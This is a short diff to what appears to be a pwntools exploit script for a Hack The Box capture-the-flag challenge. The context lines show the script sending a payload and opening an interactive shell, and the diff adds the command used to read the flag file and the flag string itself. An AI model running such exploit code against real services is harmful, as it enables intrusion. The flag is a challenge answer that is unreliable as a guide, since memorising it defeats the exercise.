@@ -74,3 +74,6 @@ io.recvuntil('Careful there! That hurt!')
 io.sendline(payload)
 io.recv()
 io.interactive()
+
+#cat /home/ctf/flag.txt
+#HTB{Th4nk_y0u_f0r_h3lp1ng_m3_w1th_th4t_bug!Y0u_s4ved_my_arm}
